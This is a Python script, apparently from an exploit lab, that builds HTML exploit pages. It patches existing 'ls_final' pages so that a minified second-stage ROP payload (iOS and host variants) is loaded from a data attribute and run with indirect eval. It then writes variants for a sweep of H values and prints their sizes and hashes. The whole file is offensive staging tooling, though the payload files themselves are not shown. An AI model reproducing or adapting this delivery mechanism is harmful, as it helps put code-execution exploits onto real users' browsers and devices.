#!/usr/bin/env python3
"""Build terser-minified attribute ROP finals at a dense H set."""
import hashlib, html, os, re, sys, zlib
HERE=os.path.dirname(os.path.abspath(__file__)); LAB=os.path.dirname(HERE); PAY=os.path.join(LAB,'payload')
OLD=("var s2=null; try{s2=localStorage.getItem(\"n1s2\");}catch(e){}\n"
     "if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }")
NEW=('var s2=null; try{var e=document.getElementById("s2"); if(e) s2=e.getAttribute("data-s2");}catch(e){}\n'
     'globalThis.RESULT += " S2LEN=" + (s2===null ? -1 : s2.length);\n'
     'try{document.getElementById("v").textContent=globalThis.RESULT;}catch(e){}\n'
     'if(hit>=0 && s2){ try{(0,eval)(s2);}catch(e2){} }')
def build(H,payload,tag):
    b=open(os.path.join(PAY,f'ls_final_h{H}_2036.html')).read(); a=re.findall(r'<script>(.*?)</script>',b,re.S)[0]
    assert OLD in a, H
    a=a.replace(OLD,NEW,1); esc=html.escape(payload,quote=True)
    h=('<!doctype html><html><head><meta charset="utf-8"></head><body>\n'
       '<div id="v">N1IOS_ATTR_ROP</div>\n<div id="s2" data-s2="'+esc+'"></div>\n<script>'+a+'</script>\n</body></html>')
    fn=f'at_rop_min_h{H}_{tag}.html'; open(os.path.join(PAY,fn),'w').write(h)
    print(f'{fn} raw={len(h)} zlib9={len(zlib.compress(h.encode(),9))} sha256={hashlib.sha256(h.encode()).hexdigest()} payload={len(payload)} esc={len(esc)}')
if __name__=='__main__':
    ios=open(os.path.join(PAY,'srop_terser.js')).read(); host=open(os.path.join(PAY,'srop_host_terser.js')).read()
    for H in [int(x) for x in sys.argv[1:]] or [200,150,250,100,300,400,500,600,0]:
        build(H,ios,'ios'); build(H,host,'host')
